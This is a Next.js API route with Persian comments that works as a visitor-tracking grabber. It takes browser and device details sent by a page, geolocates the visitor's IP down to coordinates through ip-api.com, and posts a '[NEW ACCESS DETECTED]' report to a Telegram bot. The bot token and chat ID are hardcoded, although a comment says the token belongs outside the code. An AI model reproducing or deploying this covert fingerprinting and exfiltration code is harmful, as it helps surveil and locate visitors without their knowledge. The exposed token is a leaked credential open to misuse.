// pages/api/collect.js
export default async function handler(req, res) {
  // اجازه بد به GET و POST
  if (req.method !== 'GET' && req.method !== 'POST') {
    res.setHeader('Allow', ['GET', 'POST']);
    return res.status(405).send(`Method ${req.method} Not Allowed`);
  }

  // داده‌ها از query (برای GET) یا body (برای POST)
  const data = req.method === 'POST' ? req.body : req.query;

  function countryCodeToFlagEmoji(code) {
    if (!code) return '🏳️';
    return code.toUpperCase().replace(/./g, char =>
      String.fromCodePoint(127397 + char.charCodeAt())
    );
  }

  const ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.socket.remoteAddress;

  let ipInfo = { query: ip };
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,countryCode,country,regionName,city,isp,query,org,timezone,as,lat,lon`);
    ipInfo = await response.json();
  } catch (err) {
    ipInfo = { query: ip, error: 'IP info fetch failed' };
  }

  const flag = countryCodeToFlagEmoji(ipInfo.countryCode || '');

  const message = `
📡 [NEW ACCESS DETECTED]
🧠 Agent: ${data.userAgent || 'N/A'}
📍 IP: ${ipInfo.query}
🌐 Location: ${ipInfo.city || 'N/A'}, ${ipInfo.regionName || 'N/A'} ${flag}
🗺️ Country: ${ipInfo.country || 'N/A'}
📶 ISP: ${ipInfo.isp || 'N/A'}
🏢 Org: ${ipInfo.org || 'N/A'}
🕰️ Timezone: ${ipInfo.timezone || 'N/A'}
📡 ASN: ${ipInfo.as || 'N/A'}
📍 Coordinates: ${ipInfo.lat || 'N/A'}, ${ipInfo.lon || 'N/A'}
🖥️ Platform: ${data.platform || 'N/A'}
🧮 CPU Cores: ${data.cores || 'N/A'}
🗣️ Lang: ${data.language || 'N/A'}
💾 RAM: ${data.memory ? `${data.memory} GB` : 'N/A'}
🔋 Battery: ${data.battery?.level != null ? `${data.battery.level * 100}%` : 'N/A'}
🔌 Charging: ${data.battery?.charging ? 'Yes' : 'No'}
📱 Touch: ${data.touch ? 'Yes' : 'No'}
🖼️ Screen: ${data.screen ? `${data.screen.width}x${data.screen.height}` : 'N/A'}
  `;

  const tgURL = `https://api.telegram.org/bot6589370434:AAGm4atc0M_TtErJfXF-Bu2UByHPX8UukY8/sendMessage`;

  // توجه: توکن رو از محیطی امن بخوان، قرار نده توی کد ثابت
  try {
    await fetch(tgURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: '1848591768', text: message })
    });
  } catch (e) {
    console.error('Telegram send failed', e);
  }

  return res.status(200).json({ status: 'ok' });
}
